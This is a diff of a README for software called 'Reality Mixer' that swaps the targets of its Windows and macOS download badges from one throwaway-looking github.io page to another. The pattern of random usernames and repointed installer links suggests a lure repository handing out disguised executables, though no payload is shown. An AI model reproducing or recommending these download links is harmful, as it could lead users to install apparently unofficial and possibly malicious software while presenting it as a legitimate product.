@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Reality Mixer provides the tools you nee
 
 <div align="center">
 
-[![Download Reality Mixer](https://img.shields.io/badge/⬇_DOWNLOAD_Reality+Mixer-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download Reality Mixer](https://img.shields.io/badge/⬇_DOWNLOAD_Reality+Mixer-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Reality Mixer provides the tools you nee
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
